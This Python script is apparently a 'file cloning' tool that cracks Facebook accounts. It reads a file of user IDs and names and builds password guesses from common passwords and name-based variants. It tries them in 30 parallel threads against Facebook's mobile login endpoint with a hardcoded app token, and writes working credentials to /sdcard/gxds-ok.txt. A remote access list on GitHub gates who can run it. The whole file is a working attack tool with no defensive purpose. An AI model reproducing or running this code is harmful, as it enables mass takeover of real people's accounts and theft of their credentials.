
import os, platform, string, sys, json, uuid, time, random
from concurrent.futures import ThreadPoolExecutor as ThreadPool

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests -y")
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    import requests

li = "\033[38;5;46m"
blue = "\033[94m"
white = "\033[1;97m"
cyan = "\033[1;36m"
yellow = "\033[0;33m"
black = "\033[0;30m"
lr = "\033[1;31m"
lg = "\033[0;37m"
dg = "\033[1;30m"
lp = "\033[1;35m"
lgr = "\033[1;32m"
grn = "\033[0;32m"

mxclrs="38;5"
ro=(f"\033[{mxclrs};208")
rb=(f"\033[{mxclrs};32")
rc=(f"\033[{mxclrs};122m")
rg= (f"\033[{mxclrs};112m")
rp=(f"\033[{mxclrs};147m")
gxdsprnt=str(f"{li}"*37)

gxdsanmtn3 = [
    "[■□□□□□□□□□]",
    "[■■□□□□□□□□]",
    "[■■■□□□□□□□]",
    "[■■■■□□□□□□]",
    "[■■■■■□□□□□]",
    "[■■■■■■□□□□]",
    "[■■■■■■■□□□]",
    "[■■■■■■■■□□]",
    "[■■■■■■■■■□]",
    "[■■■■■■■■■■]",
]
gxdsanmtn1 = "|/-\\"
gxdsanmtn2 = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%",
"100%"]

lxgo = f"""{lg}
                              d8b             
                              88P             
                             d88              
      d888b8b  ?88,  88P d888888   .d888b,    
     d8P' ?88   `?8bd8P'd8P' ?88   ?8b,       
     88b  ,88b  d8P?{dg}8b, 88b  ,88b    `?8b     
    `?88P'`88b d8P' `?8b`?88P'`88b`?888P'     
           )88      
{dg}           ,88P                               
       `?8888P                  {white}              \n"""

os.system('clear')
print(lxgo)
for gxdsloading in range(60):
    time.sleep(0.1)
    sys.stdout.write("\r           LOADING: " + gxdsanmtn3[gxdsloading % len(gxdsanmtn3)])
    sys.stdout.flush()

def gxdslogo():
    os.system('clear')
    print(lxgo)
 
rndm1 = chr(random.randint(ord('D'), ord('G')))
rndm2 = chr(random.randint(ord('I'), ord('O')))
rndm3 = chr(random.randint(ord('E'), ord('X')))
uuidd = str(os.geteuid()) + str(os.getlogin())
id1 = "".join(uuidd).replace("_","&").replace("360","").replace("u","GXDS").replace("a","X")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':',
'').replace('.', '').replace(')', '').replace('(', '').replace('?',
'').replace('=', '').replace('+', '').replace(';', '').replace('*',
'').replace('_', '').replace('?', '').replace('  ', '')
spce = ""
gxdsid = id1+spce+rndm2+rndm1+rndm3
gxdsAccess = requests.get('https://raw.githubusercontent.com/arterxsk/test/main/access.txt').text
    
def menu():
    gxdslogo()
    print(f"{dg}  ————————————————————————————————————————")
    print(f"\n{yellow}  [-] FILE CLONING VERSION 0.1\n")
    print(f"{dg}  ————————————————————————————————————————")
    print(f"{dg}")
    for gxdsloading in range(10):
      time.sleep(0.2)
      sys.stdout.write("\r       IDENTIFYING DEVICE:" + gxdsanmtn2[gxdsloading % len(gxdsanmtn2)])
      sys.stdout.flush()
    print("  ")
    if gxdsid in gxdsAccess:
      print(f"{lr}   YOUR DEVICE SUCCESSFULLY IDENTIFIED!")
      time.sleep(3)
      gxdsclone()
    else:
        time.sleep(2)
        print("")
        print(f"{lr}   YOUR DEVICE DON'T HAVE ACCESS")
        print(" ")
        time.sleep(3)
        print(f"{lgr}   GETTING YOUR TOKEN...")
        time.sleep(3)
        print("")
        print(f"{grn}   "+gxdsid)
        print("")
        print(f"{lg}   COPY YOUR TOKEN AND SEND THIS TO ME.\n   YOU WILL BE REDIRECTED TO MY PROFILE\n   IN A FEW SECONDS.")
        time.sleep(6)
        menu()

def gxdsclone():
    time.sleep(2)
    fl = input(
        f"{lg}  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n{lg}  [•] FILE PATH:{rc} "
    )
    print(f"{dg}")
    for gxdsloading in range(10):
      time.sleep(0.2)
      sys.stdout.write("\r                     " + gxdsanmtn2[gxdsloading % len(gxdsanmtn2)])
      sys.stdout.flush()
    print("  ")
    try:
        gxdsfiles1=open(fl,"r").read().splitlines()
    except:
        time.sleep(3)
        print(f"\n{lr}  [X] FILE NOT FOUND.")
        print(gxdsprnt)
        time.sleep(3)
        menu()
    gxdsfiles(gxdsfiles1)

def gxdsfiles(gxdsfiles1):
    time.sleep(3)
    os.system('clear')
    print(lxgo)
    tl=str(len(gxdsfiles1))
    print(f"{dg}  ————————————————————————————————————————")
    print(
        f"\n{lg}  [-] PRESS {rc}CTRL+Z{lg} TO STOP THE PROCESS.\n"
    )
    print(f"{dg}  ————————————————————————————————————————")
    print(f"{lg}  [•] TOTAL ID IN FILE:{rc} " + tl)
    print(f"{lg}  [•] FILE SAVE IN:{rc} /sdcard/gxds.txt")
    print(f"{dg}  ————————————————————————————————————————")
    print(gxdsprnt)
    with ThreadPool (max_workers=30) as GOXDIES:
        for data in gxdsfiles1:
            uid=data.split("|")[0]
            pwx=[]
            pwx.append("12345678")
            pwx.append("P@ssw0rd")
            pwx.append("123456")
            pwx.append("iloveyou")
            pwx.append("iloveyou123")
            pwx.append("1234567890")
            pwx.append("password")
            pwx.append("password123")
            pwx.append("Password")
            pwx.append("Password123")
            pwx.append("qwerty123")
            pwx.append("123456789")
            nam=data.split("|")[1]
            name=nam.lower()
            try:
                name1=name.split(" ")[0]
                nam1=nam.split(" ")[0]
                if len(name1) <3:
                    pass
                else:
                    pwx.append(nam1+'123')
                    pwx.append(name1+'143')
                    pwx.append(name1+'12')
                    pwx.append(name1+'pogi')
                    pwx.append(name1+'ganda')
                    pwx.append(name1+'123')
                    pwx.append(name1+' 123')
                    pwx.append(name1+'1234')
                    pwx.append(name1+'12345')
                    pwx.append(name1+'@#')
                    pwx.append(name1+'@@')
                    pwx.append(name1+'@@@')
                    pwx.append(name1+'@')
                    pwx.append(name1+'@123')
            except:pass
            try:
                mid_name=name.split(" ")[1]
                nam2=nam.split(" ")[1]
                if len(mid_name) <3:
                    pass
                else:
                    pwx.append(nam1+" "+nam2)
                    pwx.append(mid_name+'12')
                    pwx.append(mid_name+'123')
                    pwx.append(mid_name+' 123')
                    pwx.append(mid_name+'1234')
                    pwx.append(mid_name+'12345')
                    pwx.append(mid_name+'@#')
                    pwx.append(mid_name+'@@')
                    pwx.append(mid_name+'@')
                    pwx.append(mid_name+'@123')
                    #-Mix
                    pwx.append(name1+mid_name)
                    pwx.append(name1+mid_name+'12')
                    pwx.append(name1+mid_name+'123')
                    pwx.append(name1+mid_name+'1234')
                    pwx.append(name1+mid_name+'12345')
                    pwx.append(name1+mid_name+'@#')
                    pwx.append(name1+mid_name+'@@')
                    pwx.append(name1+mid_name+'@')
                    pwx.append(name1+mid_name+'@123')
                    pwx.append(name1+' '+mid_name)
                    pwx.append(name1+' '+mid_name+'123')
                    pwx.append(name1+' '+mid_name+'1234')
                    pwx.append(name1+' '+mid_name+'12345')
            except:pass
            try:
                sur_name=name.split(" ")[2]
                nam3=nam.split(" ")[2]
                if len(sur_name) <3:
                    pass
                else:
                    pwx.append(nam1+" "+nam2+" "+nam3)
                    pwx.append(sur_name+'123')
                    pwx.append(sur_name+'1234')
                    pwx.append(sur_name+'12345')
                    pwx.append(name1+sur_name)
                    pwx.append(name1+sur_name+'143')
                    pwx.append(name1+sur_name+'123')
                    pwx.append(name1+' '+sur_name+'143')
                    pwx.append(name1+' '+sur_name+'123')
                    pwx.append(name1+mid_name+sur_name)
                    pwx.append(name1+mid_name+sur_name+'123')
                    pwx.append(name1+mid_name+sur_name+'1234')
                    pwx.append(name1+mid_name+sur_name+'12345')
                    pwx.append(name1+mid_name+sur_name+'@#')
                    pwx.append(name1+mid_name+sur_name+'@@')
                    pwx.append(name1+mid_name+sur_name+'@')
                    pwx.append(name1+' '+mid_name+' '+sur_name)
                    pwx.append(name1+' '+mid_name+' '+sur_name+'123')
            except:pass
            GOXDIES.submit(gxds_files,uid,pwx)
loop=0
oks=[]
cps=[]
def gxds_files(uid,pwx):
    global oks,loop,cps
    sys.stdout.write(f"\r{dg}  [CHECKED] {loop} | [HITS] {str(len(oks))} | [CHECKPOINT] {str(len(cps))} ");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
            data = {
            "adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": uid,
            "password": ps,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_US",
            "client_country_code": "PH",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "62f8ce9f74b12f84c123cc23437a4a32"}
            headers = {
            'User-Agent': user_agent,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': 'graph.facebook.com',
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'MOBILE.LTE, WIFI',
            'X-Tigon-Is-Retry': 'False',
            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
            'X-fb-device-group': '5120',
            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
            'X-FB-Request-Analytics-Tags': 'graphservice',
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True',
            'X-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',}
            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
            q=json.loads(p)
            if "session_key" in q:
                print(f"\r\r{grn}  [GXDS-OK] {uid}|{ps}")
                open("/sdcard/gxds-ok.txt","a").write(uid+"|"+ps+"\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in q['error']['message']:
                print(f"\r\r{lr}  [GXDS-CP] {uid}|{ps}")
                cps.append(uid)
                break
            else:
                continue 
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass

try:
    menu()
except requests.exceptions.ConnectionError:
    print(f"{lr}  [!] NO INTERNET CONNECTION...")
except Exception as e:
    pass
